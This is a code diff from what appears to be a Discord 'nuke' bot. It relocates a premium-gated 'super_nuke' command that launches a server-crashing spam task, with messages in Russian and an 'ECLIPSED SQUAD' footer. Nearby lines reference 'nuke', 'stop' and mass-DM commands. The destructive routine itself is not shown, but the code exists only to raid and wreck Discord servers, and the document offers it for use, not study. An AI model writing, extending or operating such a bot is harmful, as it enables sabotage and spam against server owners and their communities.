@@ -286,27 +286,6 @@ async def nuke(ctx, *, text: str = None):
     asyncio.create_task(do_nuke(guild, spam_text))
 
 
-@bot.command(name="super_nuke")
-@premium_check()
-async def super_nuke(ctx, *, text: str = None):
-    guild = ctx.guild
-    if is_guild_blocked(guild.id):
-        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
-        await ctx.send(embed=embed)
-        return
-    if nuke_running.get(guild.id):
-        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
-        await ctx.send(embed=embed)
-        return
-    nuke_running[guild.id] = True
-    nuke_starter[guild.id] = ctx.author.id
-    spam_text = text if text else config.SPAM_TEXT
-    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
-    last_spam_text[guild.id] = spam_text
-    asyncio.create_task(do_super_nuke(guild, spam_text))
-
-
 @bot.command()
 @wl_check()
 async def stop(ctx):
@@ -575,6 +554,27 @@ def premium_check():
             return False
         return True
     return commands.check(predicate)
+
+
+@bot.command(name="super_nuke")
+@premium_check()
+async def super_nuke(ctx, *, text: str = None):
+    guild = ctx.guild
+    if is_guild_blocked(guild.id):
+        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
+    if nuke_running.get(guild.id):
+        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
+        await ctx.send(embed=embed)
+        return
+    nuke_running[guild.id] = True
+    nuke_starter[guild.id] = ctx.author.id
+    spam_text = text if text else config.SPAM_TEXT
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+    last_spam_text[guild.id] = spam_text
+    asyncio.create_task(do_super_nuke(guild, spam_text))
 
 
 @bot.command(name="massdm")
